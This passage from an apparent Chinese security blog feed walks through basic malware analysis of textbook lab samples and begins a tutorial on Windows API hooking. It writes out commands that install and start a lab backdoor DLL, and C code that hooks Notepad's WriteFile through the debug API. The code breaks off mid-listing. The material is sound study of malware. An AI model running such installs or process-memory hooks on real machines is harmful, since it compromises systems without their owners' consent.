另外可以运行恶意代码用工具监控恶意软件对文件，注册表，网络，进程的访问与操作。</p><p>要深入到代码层级去分析恶意代码，需要代码逆向分析的能力，需要读的懂汇编代码，熟练使用IDA进行分析，熟练使用ollydbg等调试工具。<br><img src="https://i.imgur.com/N9C61OA.png" alt=""></p><h2 id="反病毒引擎扫描-实用的第一步"><a href="#反病毒引擎扫描-实用的第一步" class="headerlink" title="反病毒引擎扫描:实用的第一步"></a>反病毒引擎扫描:实用的第一步</h2><p>当分析一个可疑的代码样本时，第一步就最好是拿多个反病毒软件扫描下这个文件，看是否有哪个引擎已经能够识别它。因为反病毒软件主要依靠一个已知的恶意代码可识别片段的特征数据库(病毒文件特征库)，以及基于行为与模式匹配的分析(启发式检测)。而攻击者可以轻易的修改自己的代码。这时，对同一个可疑恶意代码样本，运行多个不同的反病毒软件进行扫描检测 是相当有必要的，类似VirusTotal(<a href="http://www.virustotal.com/" target="_blank" rel="external">http://www.virustotal.com/</a>)<br>在没有恶意代码分析所需要的一些知识和技能的情况下，使用现成的杀毒工具无疑是最好的方法。即使有这个能力，如果恶意软件样本的泄露不会造成重要资产的泄露，使用现成的工具进行扫描也能够提供很多有用的信息，减少大量的人工投入。</p><p>其中最为常用的就是PC端的杀毒软件，如360，腾讯安全管家等。但是不管是哪款杀毒软件都存在一定的误报和漏报。使用在线等多引擎杀毒软件能够较好的反应是否为恶意软件<br><a href="http://www.virscan.org/" target="_blank" rel="external">http://www.virscan.org/</a><br>在上面的网站上，分析包括了基本信息，关键行为，进程行为，文件行为，网络行为，注册表行为，其他行为这些恶意软件常见的操作目标。<br>静态文件分析方法如下图所示（数字代表优先级，星星表示收集了对应的工具）<br><img src="https://i.imgur.com/Cp5LcV2.png" alt=""></p><h2 id="哈希值-恶意代码的指纹"><a href="#哈希值-恶意代码的指纹" class="headerlink" title="哈希值:恶意代码的指纹"></a>哈希值:恶意代码的指纹</h2><p>哈希是一种用来唯一标识恶意代码的常用方法。恶意代码样本通过一个哈希程序，会产生出一段用于唯一标识这个样本的独特哈希值(类似一种指纹)<br>MD5算法是恶意代码分析最为常用的一种哈希函数，SHA算法也同样流行。<br>如:使用md5deep程序来计算Windows操作系统自带的Solitaire程序哈希值,然后在线查找搜索这段哈希值，看看这个文件是否被识别：<br><img src="https://i.imgur.com/bEqXNCU.png" alt=""><br>图形化界面WinMD5计算器，可以同时计算和显示出多个文件的哈希值。<br><img src="https://i.imgur.com/IK6PVpj.png" alt=""><br>一旦你对一个恶意样本拥有一个哈希值之后，你可以把它做如下用途:<br>将哈希值作为标签使用<br>与其他分析师分享哈希值，以帮助他们来识别恶意代码<br>在线搜索这段 哈希值，看看这个文件是否被识</p><h2 id="查找字符串"><a href="#查找字符串" class="headerlink" title="查找字符串"></a>查找字符串</h2><p>一个程序会包含一些字符串，比如打印出的消息，连接的URL,或者复制文到某个特定的位置。从字符串中进行搜索是获取程序功能提示的一种简单方法 。比如程序访问一个URL，访问的URL就是存储为程序中的一个字符串。可以使用String程序(<a href="http://technet.microsoft.com/enus/sysinternals/bb897439)来搜索可执行文件中可打印的字符串。" target="_blank" rel="external">http://technet.microsoft.com/enus/sysinternals/bb897439)来搜索可执行文件中可打印的字符串。</a><br>而一般在可执行文件中是以ACSII码和Unicode(这里指的是微软的)存储的，如下<br><img src="https://i.imgur.com/usLtFRz.png" alt=""><br>查找结果<br><img src="https://i.imgur.com/qLjIY8G.png" alt=""></p><h2 id="加壳与混淆恶意代码"><a href="#加壳与混淆恶意代码" class="headerlink" title="加壳与混淆恶意代码"></a>加壳与混淆恶意代码</h2><p>恶意代码编写者经常使用加壳或混淆技术，让程序更难被检测或分析。混淆程序是恶意代码编写者尝试去隐藏其执行过程的代码。而加壳程序则是混淆程序的一类，加壳后的恶意程序一般会被压缩，并且难以分析。<br>合法程序大多总是会包含很多字符串，而由被加壳或混淆的恶意代码直接分析获得的字符串很少(一般包含LoadLibrary和GetProcAddress函数，他们是用来加载和使用其他函数功能的)。</p><h2 id="文件加壳"><a href="#文件加壳" class="headerlink" title="文件加壳"></a>文件加壳</h2><p>当加壳文件的程序运行时，会先进行一小段的脱壳代码，来解压缩加壳的文件，然后在运行脱壳后的文件，如下图。<br><img src="https://i.imgur.com/Xe453HQ.png" alt=""><br>当对一个加壳程序进行静态分析时，只有这一小段代码可以被解析。</p><h3 id="使用PEID-或exeinfoPE-检测加壳"><a href="#使用PEID-或exeinfoPE-检测加壳" class="headerlink" title="使用PEID(或exeinfoPE)检测加壳"></a>使用PEID(或exeinfoPE)检测加壳</h3><h2 id="PE的文件结构"><a href="#PE的文件结构" class="headerlink" title="PE的文件结构"></a>PE的文件结构</h2><p>我前面有写<br><a href="https://esebanana.github.io/2018/03/21/re_PE/" target="_blank" rel="external">https://esebanana.github.io/2018/03/21/re_PE/</a></p><h2 id="链接库与函数"><a href="#链接库与函数" class="headerlink" title="链接库与函数"></a>链接库与函数</h2><p>对于一个可执行文件，我们可以收集到最有用的信息之一，就是它的导入表。导入表函数是一个程序所使用的函数，但存储在其他程序中的那些函数。链接分为:静态链接，运行时链接与动态链接</p><h3 id="静态链接，运行时链接与动态链接"><a href="#静态链接，运行时链接与动态链接" class="headerlink" title="静态链接，运行时链接与动态链接"></a>静态链接，运行时链接与动态链接</h3><pre><code>静态链接是Windows平台链接代码库最不常用的方法，当一个库被静态链接到可执行文件时，所有这个库中的代码都会被复制到可执行文件中。这会让执行程序大很多。运行时链接在合法程序中并不流行，但是在恶意代码中是常用的，特别是当恶意代码被加壳或是混淆的时候。使用运行时链接的可执行程序，只有当需要使用函数时，才链接到库，而不是想动态链接模式那样在程序启动时就会链接。动态链接是windows里最常用的，将一些函数打包在一个dll里，然后通过程序调用dll里的函数，在程序启动时就会链接上。</code></pre><h3 id="使用Dependency-Walker工具探索动态链接函数"><a href="#使用Dependency-Walker工具探索动态链接函数" class="headerlink" title="使用Dependency Walker工具探索动态链接函数"></a>使用Dependency Walker工具探索动态链接函数</h3><p>界面<br><img src="https://i.imgur.com/GPksbSz.png" alt=""><br>常见的dll<br><img src="https://i.imgur.com/l6sqRh6.png" alt=""></p><h2 id="静态分析技术实践"><a href="#静态分析技术实践" class="headerlink" title="静态分析技术实践"></a>静态分析技术实践</h2><p>学习样本:(<a href="http://www.practicalmalwareanalysis.com)或(http://www.nostarch.com/malware.htm" target="_blank" rel="external">http://www.practicalmalwareanalysis.com)或(http://www.nostarch.com/malware.htm</a>)</p><h3 id="反病毒引擎扫描"><a href="#反病毒引擎扫描" class="headerlink" title="反病毒引擎扫描"></a>反病毒引擎扫描</h3><p>将Lab01-01.exe和Lab01-01.dll放到<a href="https://www.virustotal.com结果如下(我是翻墙的)：" target="_blank" rel="external">https://www.virustotal.com结果如下(我是翻墙的)：</a><br><img src="https://i.imgur.com/0oxKOCq.png" alt=""><br><img src="https://i.imgur.com/9q5Cwxd.png" alt=""></p><h3 id="什么时候编译的"><a href="#什么时候编译的" class="headerlink" title="什么时候编译的"></a>什么时候编译的</h3><p><img src="https://i.imgur.com/2fCf4JN.png" alt=""></p><h3 id="是否被混淆或者加壳"><a href="#是否被混淆或者加壳" class="headerlink" title="是否被混淆或者加壳"></a>是否被混淆或者加壳</h3><p><img src="https://i.imgur.com/6l4SNrb.png" alt=""><br>发现并没有加壳，但是用Dependency Walker查看发现并没有很多函数，可能被混淆啦。接着用strings 查看dll,发现一个ip地址<br><img src="https://i.imgur.com/tY54N4S.png" alt=""></p><h3 id="是否导入函数，是做什么的"><a href="#是否导入函数，是做什么的" class="headerlink" title="是否导入函数，是做什么的"></a>是否导入函数，是做什么的</h3><p>发现有两个重要的结果<br>1.点用到内核函数库Kernel32.dll函数库中的几个重要的函数，CreateProcessA，Sleep.<br>2.调用MSVCRT.dll多线程库，调用网络链接库，外加上一个IP地址，猜测用到http服务</p><h3 id="是否有任何其它文件或基于主机的迹象"><a href="#是否有任何其它文件或基于主机的迹象" class="headerlink" title="是否有任何其它文件或基于主机的迹象"></a>是否有任何其它文件或基于主机的迹象</h3><p>用PEview打开<br><img src="https://i.imgur.com/lyOtUHh.png" alt=""><br>首先是两个近似函数Kernel32.dll  与Kerne132.dll，初步判断是进行文件混淆目的。<br>然后是一个系统目录路径，一个函数Kerne132.dll，初步判断是这个路径和Kerne132.dll存在某种关联。<br>然后再来两个Kernel32.dll 和Lab01-01.dll，Lab01-01.dll这很明显就是上面分析的.dll文件，所以初步判定是这个程序需要调用到Kernel32.dll 和Lab01-01.dll。<br>然后是系统路径和Kernel32.dll文件，和一个函数。这就是说调用到系统路径里的Kernel32.dll文件的某个函数<br>众多联系起来可以进一步判断，这个程序实现的功能是在系统路径中寻找，创建，复制一个Kerne132.dll文件，然后还调用了Lab01-01.dll文件实现它里面的功能。</p><h3 id="是否有基于网络的迹象"><a href="#是否有基于网络的迹象" class="headerlink" title="是否有基于网络的迹象"></a>是否有基于网络的迹象</h3><p>有基于网络的迹象，发现IP：127.26.152.13</p><h3 id="文件的目的是什么"><a href="#文件的目的是什么" class="headerlink" title="文件的目的是什么"></a>文件的目的是什么</h3><p>该文件并没有加壳，她住要实现的功能是，调用Kernel32.dll文件的相关函数，实现在系统目录里面遍历查找是否存在Kerne132.dll文件，如果不存在就进行创建Kerne132.dll文件，进行混淆Kernel32.dll文件，然后再调用Lab01-01.dll文件，实现通过联通网络，然后接受目标IP：127.26.152.13传过来的指令，通过该文件后门向系统发出休眠指令使得系统进入休眠状态。</p><h1 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h1><p>动态分析就是在运行恶意代码之后进行检查的过程。动态分析技术是恶意代码分析流程的第二步，一般在静态分析基础技术进入一个困难的时候。，动态分析能让你观察到恶意代码的真实功能，一个行为存在二进制程序中，并不意味着他就会执行，动态分析也是一种识别恶意代码功能的有效方法。虽然动态分析技术分成好用，但它还是应该在静态分析基础技术之后进行。</p><h2 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h2><h3 id="简便但粗糙的方法"><a href="#简便但粗糙的方法" class="headerlink" title="简便但粗糙的方法"></a>简便但粗糙的方法</h3><p>有几个功能一体化的软件产品，可以用来进行基本的动态分析，最流行的就是沙箱技术，沙箱是一种在安全环境里运行不信任程序的安全机制，不用担心伤害到”真正的”系统。沙箱包含一个虚拟环境，通过某种方式模拟网络服务，以确保被测试的软件或恶意代码能正常执行。</p><h3 id="使用恶意代码沙箱"><a href="#使用恶意代码沙箱" class="headerlink" title="使用恶意代码沙箱"></a>使用恶意代码沙箱</h3><p>许多分析容易的代码的沙箱，诸如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Norman沙箱，GFI沙箱，Anubis,Joe沙箱、ThreatExpert\BitBlaze和Comodo</div></pre></td></tr></table></figure></p><p>恶意代码分析，等等，都是提供免费分析恶意代码服务。Norman沙箱，GFI沙箱是最受欢迎的。这些沙箱都提供容易理解的输出结果，而且用来做初诊断非常有用，而且这些沙箱都是自动执行的。</p><h2 id="rundll32-exe"><a href="#rundll32-exe" class="headerlink" title="rundll32.exe"></a>rundll32.exe</h2><p>所有windows版本中都包含rundll32.exe程序，它提供了一个运行DLL的平台<br>语法：C:\rundll32.exe DLLname,Export arguments</p><h2 id="Process-Monitor"><a href="#Process-Monitor" class="headerlink" title="Process Monitor"></a>Process Monitor</h2><p>进程监视器，它提供一种方式来监控注册表，文件系统，网络，进程和线程行为，结合并增强了FileMon和RegMon的功能</p><h2 id="Process-Explorer"><a href="#Process-Explorer" class="headerlink" title="Process Explorer"></a>Process Explorer</h2><p>进程浏览器，用来列出所有活跃的进程，被进程载入的DLL，各种进程属性和整体系统信息，也可以用它杀死一个进程，退出用户登录，启动与激活进程</p><h2 id="Dependency-Walker"><a href="#Dependency-Walker" class="headerlink" title="Dependency Walker"></a>Dependency Walker</h2><p>支持列出可执行文件的动态链接</p><h2 id="Regshot"><a href="#Regshot" class="headerlink" title="Regshot"></a>Regshot</h2><p>注册表比较工具，可以比较两个注册表的快照，发现差异</p><h2 id="ApateDNS"><a href="#ApateDNS" class="headerlink" title="ApateDNS"></a>ApateDNS</h2><p>用来查看恶意代码发出的DNS请求</p><h2 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h2><p>被用在支持端口扫描，隧道，代理，端口转发等对内外连接上</p><h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><p>嗅探器，截获并记录网络数据包的工具</p><h2 id="INetSim"><a href="#INetSim" class="headerlink" title="INetSim"></a>INetSim</h2><p>基于linux模拟常见网络服务的免费软件，通过模拟服务（HTTP，HTTPS，FTP，IRC，DNS，SMTP等），允许你来分析未知恶意代码的网络行为</p><h2 id="动态分析技术实践"><a href="#动态分析技术实践" class="headerlink" title="动态分析技术实践"></a>动态分析技术实践</h2><h3 id="lab3-1"><a href="#lab3-1" class="headerlink" title="lab3-1"></a>lab3-1</h3><h4 id="找出这个恶意代码的导入函数与字符串列表"><a href="#找出这个恶意代码的导入函数与字符串列表" class="headerlink" title="找出这个恶意代码的导入函数与字符串列表"></a>找出这个恶意代码的导入函数与字符串列表</h4><p>用Dependecy Walker和Peid查看,发现导入函数很少，接着发现加壳<br><img src="https://i.imgur.com/1VeV9Fp.png" alt=""><br>用strings工具查看，发现一个网站和admin，注册表<br><img src="https://i.imgur.com/GfEHrtj.png" alt=""></p><h4 id="这个恶意代码在主机上的感染迹象特征是什么"><a href="#这个恶意代码在主机上的感染迹象特征是什么" class="headerlink" title="这个恶意代码在主机上的感染迹象特征是什么"></a>这个恶意代码在主机上的感染迹象特征是什么</h4><p>先将虚拟机拍快照，然后准备运行，win7上发现运行不了<br><img src="https://i.imgur.com/7yBNGk5.png" alt=""><br>然后找个xp pro x86的运行<br><img src="https://i.imgur.com/nnmlZWy.png" alt=""><br>可以看出程序一共修改了17处的注册表，其中，增加了2个键，3个值，改变了12个指，新建的键是上面这2个，新建了两个打印的键，新添加的值是上面这3个，一个是开机启动的值，为C:\WINDOWS\system32\vmx32to64.ex。</p><h4 id="是否存在一些有用的网络特征码？"><a href="#是否存在一些有用的网络特征码？" class="headerlink" title="是否存在一些有用的网络特征码？"></a>是否存在一些有用的网络特征码？</h4><p>网络特征码就是那个恶意域名的解析过程和https的连接</p><h3 id="lab3-1-1"><a href="#lab3-1-1" class="headerlink" title="lab3-1"></a>lab3-1</h3><h4 id="你怎样才能让这个恶意代码自行安装"><a href="#你怎样才能让这个恶意代码自行安装" class="headerlink" title="你怎样才能让这个恶意代码自行安装"></a>你怎样才能让这个恶意代码自行安装</h4><p>有PEview查看dll的导入表<br><img src="https://i.imgur.com/glgDAB1.png" alt=""><br>用Dependency Walker查看依赖，会发现一些创建线程函数，注册表，网络服务。<br><img src="https://i.imgur.com/DHYqe5h.png" alt=""><br>用strings来看看，发现一个域名practicalmalwareanalysis.com，serve.html，getfile，cmd.exe /c,还有一些注册表操作的语句<br><img src="https://i.imgur.com/bTutnPU.png" alt=""><br>这是运行:<br><code>rundll32.exe Lab03-02.dll,install</code></p><h4 id="在安装之后，你如何让这个恶意代码运行起来？"><a href="#在安装之后，你如何让这个恶意代码运行起来？" class="headerlink" title="在安装之后，你如何让这个恶意代码运行起来？"></a>在安装之后，你如何让这个恶意代码运行起来？</h4><p>用windows启动服务的方式来启动<br><code>net start IPRIP</code></p><h4 id="你怎么能找到这个恶意代码是在哪个进程下运行的？"><a href="#你怎么能找到这个恶意代码是在哪个进程下运行的？" class="headerlink" title="你怎么能找到这个恶意代码是在哪个进程下运行的？"></a>你怎么能找到这个恶意代码是在哪个进程下运行的？</h4><p>用Process Explorer，Find菜单-&gt; Find Handle or DLL…寻找我们那个DLL文件</p><h4 id="你可以在procmon工具中设置什么样的过滤器，才能收集这个恶意代码的信息？"><a href="#你可以在procmon工具中设置什么样的过滤器，才能收集这个恶意代码的信息？" class="headerlink" title="你可以在procmon工具中设置什么样的过滤器，才能收集这个恶意代码的信息？"></a>你可以在procmon工具中设置什么样的过滤器，才能收集这个恶意代码的信息？</h4><p>用发现的PID就行过滤，</p><h4 id="这个恶意代码在主机上的感染迹象是什么？"><a href="#这个恶意代码在主机上的感染迹象是什么？" class="headerlink" title="这个恶意代码在主机上的感染迹象是什么？"></a>这个恶意代码在主机上的感染迹象是什么？</h4><p>感染迹象就是会有创建一个服务叫IPRIP</p><h4 id="这个恶意代码是否存在一些有用的网路特征码？"><a href="#这个恶意代码是否存在一些有用的网路特征码？" class="headerlink" title="这个恶意代码是否存在一些有用的网路特征码？"></a>这个恶意代码是否存在一些有用的网路特征码？</h4><p>我们先去看看DNSChef和INetSim服务器上的 记录，先检查一下dns的解析记录，用DNSChef虚拟机看，和我们前面发现的恶意域名是对应的，记录在log/service.log里面，这个DLL从我们的fake服务器下载一个serve.html，而我们伟大的INetSim返回了sample.html作为serve.html，其实这里就不需要用netcat来监听本地80端口了<br>所以这个网络特征就是那个漫长的恶意域名的解析，和对恶意域名请求一个serve.html</p><h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p>这里可以下载到所有的工具:<br><a href="https://github.com/vito-L/malware-analysis/blob/master/Tools.md" target="_blank" rel="external">https://github.com/vito-L/malware-analysis/blob/master/Tools.md</a><br>恶意代码分析实战</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;啥？你电脑中病毒啦，被勒索啦，那就来好好学习恶意代码分析，讲得很好。留下了没有技术的眼泪&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>Re——Hook</title>
    <link href="http://yoursite.com/2018/04/16/re_12_hook/"/>
    <id>http://yoursite.com/2018/04/16/re_12_hook/</id>
    <published>2018-04-16T00:49:18.000Z</published>
    <updated>2018-05-15T00:35:05.026Z</updated>
    
    <content type="html"><![CDATA[<p>逆向分析之”花”。windows的Hook是程序设计中最为灵活多变的技巧之一。Hook有两种含义:1、系统提供的消息Hook机制;2、自定义的Hook编程技巧，<br><a id="more"></a><br>Hook（钩子）是WINDOWS提供的一种消息处理机制平台，是指在程序正常运<br>行中接受信息之前预先启动的函数，用来检查和修改传给该程序的信息，（钩子）实<br>际上是一个处理消息的程序段，通过系统调用，把它挂入系统。每当特定的消息发出，<br>在没有到达目的窗口前，钩子程序就先捕获该消息，亦即钩子函数先得到控制权。</p><h1 id="钩取方式"><a href="#钩取方式" class="headerlink" title="钩取方式"></a>钩取方式</h1><p>如图，一般有三种API钩取方式：<br><img src="https://i.imgur.com/UaTkYDc.png" alt=""><br>下面都以Notepad.exe的WriteFile() API为例钩取</p><h1 id="方式1——动态-进程内存"><a href="#方式1——动态-进程内存" class="headerlink" title="方式1——动态-进程内存"></a>方式1——动态-进程内存</h1><p>直接在API加载时调用钩取<br>动态-进程内存-代码-调试技术<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></div><div class="line"></div><div class="line">LPVOID g_pfWriteFile = <span class="literal">NULL</span>;  <span class="comment">//writefile函数的地址</span></div><div class="line">CREATE_PROCESS_DEBUG_INFO g_cpdi; <span class="comment">//存放调试信息</span></div><div class="line">BYTE g_chINT3 = <span class="number">0xCC</span>, g_chOrgByte = <span class="number">0</span>;<span class="comment">//0xCC是int 3的机器码</span></div><div class="line"></div><div class="line"><span class="comment">//当创建进程调试事件时运行此</span></div><div class="line"><span class="function">BOOL <span class="title">OnCreateProcessDebugEvent</span><span class="params">(LPDEBUG_EVENT pde)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="comment">// WriteFile() API Address 获取地址</span></div><div class="line">g_pfWriteFile = GetProcAddress(GetModuleHandleA(<span class="string">"kernel32.dll"</span>), <span class="string">"WriteFile"</span>);</div><div class="line"></div><div class="line"><span class="comment">// API Hook - WriteFile()</span></div><div class="line"><span class="comment">//不知道？？？</span></div><div class="line"><span class="built_in">memcpy</span>(&amp;g_cpdi, &amp;pde-&gt;u.CreateProcessInfo, <span class="keyword">sizeof</span>(CREATE_PROCESS_DEBUG_INFO));</div><div class="line"><span class="comment">//这里读出 WriteFile()的首地址并备份在g_chOrgByte，后面脱钩会用到</span></div><div class="line">ReadProcessMemory(g_cpdi.hProcess, g_pfWriteFile,&amp;g_chOrgByte, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</div><div class="line"><span class="comment">//将0xCC(INT 3) 写入WriteFile() API Address的第一个字节</span></div><div class="line">WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile,&amp;g_chINT3, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</div><div class="line"></div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//当异常发生时，也就是 WriteFile()函数执行结束</span></div><div class="line"><span class="function">BOOL <span class="title">OnExceptionDebugEvent</span><span class="params">(LPDEBUG_EVENT pde)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">CONTEXT ctx;   <span class="comment">//记录hook的上下文</span></div><div class="line">PBYTE lpBuffer = <span class="literal">NULL</span>;<span class="comment">//用于临时缓冲区</span></div><div class="line">DWORD dwNumOfBytesToWrite, dwAddrOfBuffer, i;</div><div class="line">PEXCEPTION_RECORD per = &amp;pde-&gt;u.Exception.ExceptionRecord;</div><div class="line"></div><div class="line"><span class="comment">// BreakPoint exception (INT 3) 当断点是3时，这样就一定会先执行OnCreateProcessDebugEvent</span></div><div class="line"><span class="keyword">if</span> (EXCEPTION_BREAKPOINT == per-&gt;ExceptionCode)</div><div class="line">&#123;</div><div class="line"><span class="comment">// BP Address == WriteFile() Address </span></div><div class="line"><span class="keyword">if</span> (g_pfWriteFile == per-&gt;ExceptionAddress)</div><div class="line">&#123;</div><div class="line"><span class="comment">// #1. Unhook 恢复 WriteFile()的首地址的值，也就是改为刚才备份g_chOrgByte</span></div><div class="line">WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile,&amp;g_chOrgByte, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</div><div class="line"></div><div class="line"><span class="comment">// #2. Thread Context 获取线程的上下文</span></div><div class="line">ctx.ContextFlags = CONTEXT_CONTROL;</div><div class="line">GetThreadContext(g_cpdi.hThread, &amp;ctx);</div><div class="line"></div><div class="line"><span class="comment">// #3. WriteFile() 函数参数param 2, 3 的值</span></div><div class="line"><span class="comment">//   param 2 : ESP + 0x8 (这里是32位)</span></div><div class="line"><span class="comment">//   param 3 : ESP + 0xC</span></div><div class="line">ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + <span class="number">0x8</span>),&amp;dwAddrOfBuffer, <span class="keyword">sizeof</span>(DWORD), <span class="literal">NULL</span>);</div><div class="line">ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + <span class="number">0xC</span>),&amp;dwNumOfBytesToWrite, <span class="keyword">sizeof</span>(DWORD), <span class="literal">NULL</span>);</div><div class="line"></div><div class="line"><span class="comment">// #4. 分配临时缓冲区</span></div><div class="line">lpBuffer = (PBYTE)<span class="built_in">malloc</span>(dwNumOfBytesToWrite + <span class="number">1</span>);</div><div class="line"><span class="built_in">memset</span>(lpBuffer, <span class="number">0</span>, dwNumOfBytesToWrite + <span class="number">1</span>);</div><div class="line"></div><div class="line"><span class="comment">// #5. WriteFile() 的输入 复制 缓冲区</span></div><div class="line">ReadProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer,lpBuffer, dwNumOfBytesToWrite, <span class="literal">NULL</span>);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"\n### original string ###\n%s\n"</span>, lpBuffer);</div><div class="line"></div><div class="line"><span class="comment">// #6. 将小写转换成大写</span></div><div class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dwNumOfBytesToWrite; i++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (<span class="number">0x61</span> &lt;= lpBuffer[i] &amp;&amp; lpBuffer[i] &lt;= <span class="number">0x7A</span>)</div><div class="line">lpBuffer[i] -= <span class="number">0x20</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">printf</span>(<span class="string">"\n### converted string ###\n%s\n"</span>, lpBuffer);</div><div class="line"></div><div class="line"><span class="comment">// #7. 将变换后缓冲区 的数据写入WriteFile()函数的缓冲区</span></div><div class="line">WriteProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer,lpBuffer, dwNumOfBytesToWrite, <span class="literal">NULL</span>);</div><div class="line"></div><div class="line"><span class="comment">// #8. 释放缓冲区</span></div><div class="line"><span class="built_in">free</span>(lpBuffer);</div><div class="line"></div><div class="line"><span class="comment">// #9. 将上下文的EIP更改为 WriteFile()的首地址</span></div><div class="line">ctx.Eip = (DWORD)g_pfWriteFile;</div><div class="line">SetThreadContext(g_cpdi.hThread, &amp;ctx);</div><div class="line"></div><div class="line"><span class="comment">// #10. 运行被调试的进程</span></div><div class="line">ContinueDebugEvent(pde-&gt;dwProcessId, pde-&gt;dwThreadId, DBG_CONTINUE);</div><div class="line"></div><div class="line"><span class="comment">//释放当前的时间片，即放弃当前线程执行的CPU的时间片</span></div><div class="line">Sleep(<span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="comment">// #11. API Hook</span></div><div class="line">WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile,&amp;g_chINT3, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</div><div class="line"></div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">DebugLoop</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">DEBUG_EVENT de;</div><div class="line">DWORD dwContinueStatus;</div><div class="line"></div><div class="line"><span class="comment">// Waiting Debuggee event 等待调试事件的发生 ，循环调试</span></div><div class="line"><span class="keyword">while</span> (WaitForDebugEvent(&amp;de, INFINITE))</div><div class="line">&#123;</div><div class="line">dwContinueStatus = DBG_CONTINUE;</div><div class="line"></div><div class="line"><span class="comment">// Debuggee  attach 属于SEH异常一种</span></div><div class="line"><span class="keyword">if</span> (CREATE_PROCESS_DEBUG_EVENT == de.dwDebugEventCode)</div><div class="line">&#123;</div><div class="line">OnCreateProcessDebugEvent(&amp;de);  <span class="comment">//跳到下一个函数</span></div><div class="line">&#125;</div><div class="line"><span class="comment">// 异常事件  属于SEH异常一种</span></div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (EXCEPTION_DEBUG_EVENT == de.dwDebugEventCode)</div><div class="line">&#123;</div><div class="line"><span class="comment">//跳到下一个函数</span></div><div class="line"><span class="keyword">if</span> 